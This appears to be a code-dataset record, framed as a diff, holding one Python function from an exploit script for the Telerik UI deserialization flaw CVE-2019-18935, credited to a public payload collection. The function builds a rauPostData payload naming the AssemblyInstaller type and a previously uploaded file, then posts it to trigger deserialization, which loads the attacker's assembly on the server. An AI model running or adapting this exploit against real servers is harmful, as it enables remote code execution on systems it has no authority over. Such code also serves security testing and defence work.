@@ -1,0 +1,7 @@
+{
+    "code": "def deserialize():\n\n    # Build rauPostData.\n    object = {\n        'Path': 'file:///' + temp_target_folder.replace('\\\\', '/') + '/' + filename_remote\n    }\n    type = 'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=' + net_version + ', Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'\n    raupostdata = build_raupostdata(object, type)\n    \n    # Build multipart form data.\n    files = {\n        'rauPostData': (None, raupostdata),  # Only need this now.\n        '': ''  # One extra input is required for the page to process the request.\n    }\n    \n    # Send request.\n    print('\\n[*] Triggering deserialization for .NET v' + net_version + '...\\n', file=stderr)\n    start = time()\n    send_request(files)\n    end = time()\n    print('\\n[*] Response time:', round(end - start, 2), 'seconds', file=stderr)",
+    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
+    "file": "CVE Exploits/Telerik CVE-2019-18935.py",
+    "license": "MIT",
+    "language": "python"
+}
